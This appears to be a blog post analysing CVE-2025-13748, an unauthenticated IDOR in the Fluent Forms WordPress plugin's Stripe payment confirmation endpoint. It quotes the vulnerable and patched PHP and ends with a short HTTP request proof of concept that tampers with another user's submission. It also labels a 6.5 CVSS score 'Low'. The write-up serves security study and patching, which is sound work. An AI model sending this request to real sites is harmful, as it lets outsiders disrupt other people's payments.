---
title: CVE-2025-13748 Analysis & POC
description: Security Vulnerability in WordPress FluentForm Plugin.
date: 2025-12-27 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, idor]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
The plugin **Fluent Forms – Customizable Contact Forms, Survey, Quiz, & Conversational Form Builder** contains an **Insecure Direct Object Reference (IDOR)** vulnerability in all versions **≤ 6.1.7** via the `submission_id` parameter in the SCA payment confirmation endpoint.
The vulnerability allows **unauthenticated users** to **mark other users' submissions as failed**, disrupting the payment process.

* **CVE ID**: [CVE-2025-13748](https://www.cve.org/CVERecord?id=CVE-2025-13748)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 6.1.7
* **Patched Versions**: 6.1.8
* **CVSS severity**: Low (6.5)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress FluentForm Plugin](https://wordpress.org/plugins/fluentform/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **FluentForm**:  
    * `6.1.7` – **vulnerable**  
    * `6.1.8` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Analysis 
The plugin registers an AJAX handler **for unauthenticated users**:

```php {title="StripeInlineProcessor.php v6.1.7" data-open=true hl_lines=[]}
add_action('wp_ajax_nopriv_fluentform_sca_inline_confirm_payment', [$this, 'confirmScaPayment']);
```

`wp_ajax_nopriv_` is a hook for unauthenticated users. When a request is sent to the endpoint `/wp-admin/admin-ajax.php` with the parameter `action=fluentform_sca_inline_confirm_payment`, the callback `confirmScaPayment` is executed:

```php {title="StripeInlineProcessor.php v6.1.7" data-open=true hl_lines=[]}
public function confirmScaPayment()
{
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $formId = isset($_REQUEST['form_id']) ? intval($_REQUEST['form_id']) : 0;
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0;
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $paymentMethod = isset($_REQUEST['payment_method']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_method'])) : '';
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $paymentIntentId = isset($_REQUEST['payment_intent_id']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_intent_id'])) : '';

    $this->setSubmissionId($submissionId);
    $submission = $this->getSubmission();
    $this->form = $this->getForm();

    $transaction = $this->getLastTransaction($submissionId);

    $confirmation = SCA::confirmPayment($paymentIntentId, [
        'payment_method' => $paymentMethod
    ], $formId);

    if (is_wp_error($confirmation)) {
        $message = 'Payment has been failed. ' . $confirmation->get_error_message();
        $this->handlePaymentChargeError($message, $submission, $transaction, $confirmation, 'payment_error');
    }

    if ($confirmation->status == 'succeeded') {
        $charge = $confirmation->charges->data[0];;
        $this->handlePaymentSuccess($charge, $transaction, $submission);
    } else {
        $this->handlePaymentChargeError('We could not verify your payment. Please try again', $submission, $transaction, $confirmation, 'payment_error');
    }
}
```

Inside `confirmScaPayment()`, the plugin retrieves `submission_id` directly from the request:

```php
$submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0;
```

This value:

* Is not bound to the current user
* Has no ownership validation
* Is not checked for relationship with `form_id`

Meaning: anyone can send a request and reference any existing submission ID in the database.

After retrieving `submission_id`, the system continues:

```php
$this->setSubmissionId($submissionId);
$submission = $this->getSubmission();
```

> [!BUG] This is where the core IDOR occurs: the object (submission) is accessed directly using a user-controlled ID, without any access control.

There is no logic such as:

```php
if ($submission->user_id !== get_current_user_id()) {
    deny_access();
}
```

Or:

```php
if ($submission->form_id !== $formId) {
    deny_access();
}
```

This allows submissions belonging to other users to be manipulated by unauthenticated attackers.

In the patched version, the entire request must pass strict validation:

![Patch](patch.png "Patch")

```php
protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)
{
    $strictMode = apply_filters('fluentform/stripe_sca_strict_security', false);
    $warnings = [];

    // Validate nonce (optional in non-strict mode for backward compatibility)
    $nonce = isset($_REQUEST['_ff_stripe_nonce']) ? sanitize_text_field(wp_unslash($_REQUEST['_ff_stripe_nonce'])) : '';
    
    if ($nonce) {
        $nonceAction = 'fluentform_sca_confirm_' . $submissionId;
        if (!wp_verify_nonce($nonce, $nonceAction)) {
            $error = __('Security verification failed. Invalid nonce.', 'fluentform');
            if ($strictMode) {
                return new \WP_Error('invalid_nonce', $error);
            }
            $warnings[] = 'Invalid nonce provided';
        }
    } else {
        $warning = 'No nonce provided for SCA payment confirmation';
        if ($strictMode) {
            return new \WP_Error('missing_nonce', __('Security verification failed. Nonce required.', 'fluentform'));
        }
        $warnings[] = $warning;
    }

    // Validate submission exists
    if (!$submission || !$submission->id) {
        return new \WP_Error('invalid_submission', __('Invalid submission.', 'fluentform'));
    }

    if ($submission->payment_status === 'paid') {
        return new \WP_Error(
            'already_paid',
            __('This payment has already been completed and cannot be modified.', 'fluentform')
        );
    }

    // stores it in transaction.charge_id, and frontend sends it back.
    // Mismatch only occurs during attack attempts.
    if ($transaction && $transaction->charge_id) {
        if ($transaction->charge_id !== $paymentIntentId) {
            return new \WP_Error(
                'payment_intent_mismatch',
                __('Payment verification failed. Payment intent does not match.', 'fluentform')
            );
        }
    }

    // Log warnings for monitoring
    if (!empty($warnings) && defined('WP_DEBUG') && WP_DEBUG) {
        $logData = [
            'parent_source_id' => $submission->form_id,
            'source_type'      => 'submission_item',
            'source_id'        => $submission->id,
            'component'        => 'Payment',
            'status'           => 'warning',
            'title'            => __('Stripe SCA Security Warning', 'fluentform'),
            'description'      => implode('; ', $warnings)
        ];
        do_action('fluentform/log_data', $logData);
    }

    return [
        'valid'    => true,
        'warnings' => $warnings
    ];
}
```

The `validateScaRequest` function:

* Verifies that `submission_id` exists and is valid
* Prevents processing if the submission is already paid
* Binds `payment_intent_id` to the corresponding transaction
* Prevents forged payment intents
* Adds nonce verification
* Logs abnormal behavior
* Fully blocks unauthorized submission state manipulation

This effectively eliminates the IDOR vulnerability.

## Flow
{{< mermaid >}}
flowchart TD
A["Unauthenticated Attacker"] 
--> B["Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment"]

B --> C["Extract submission_id & payment_intent_id from request"]

C --> D["No nonce validation"]

D --> E["Load submission by submission_id"]

E --> F["No ownership or relationship check"]

F --> G["Load transaction using submission_id"]

G --> H["No validation between payment_intent_id and transaction"]

H --> I["Process payment confirmation"]

I --> J["Update submission status (success / failed)"]

J --> K["Attacker manipulates victim's submission"]
{{< /mermaid >}}

## Proof of Concept (PoC)
Send request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

action=fluentform_sca_inline_confirm_payment
&submission_id=1024
&payment_method=card
&payment_intent_id=pi_fake
```

## Conclusion

The CVE-2025-13748 vulnerability stems from **trusting client-controlled input**, specifically `submission_id`, without any ownership or context validation. The payment confirmation endpoint is exposed to unauthenticated users and allows direct manipulation of submissions without binding them to a legitimate user, form, or transaction.

The lack of ownership checks, missing linkage between `payment_intent_id` and transaction, and absence of request authentication collectively enable attackers to **manipulate other users’ payment states**. This is a textbook case of **Insecure Direct Object Reference (IDOR)** caused by flawed business logic rather than a low-level technical bug.

The patch fully resolves the issue by introducing layered validation, strict checks, and contextual binding, eliminating the attack surface.

## Key Takeaways

* Never trust client-supplied data, even in internal payment flows.
* IDOR vulnerabilities often stem from missing ownership validation, not missing input sanitization.
* `wp_ajax_nopriv_*` endpoints must be strictly protected as they are accessible to everyone.
* Payment flows must tightly bind **submission – transaction – payment intent**.
* Always validate both **request origin** and **business context**, not just data format.
* Defense-in-depth is the only effective way to prevent IDOR.

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress FluentForm Plugin <= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability)
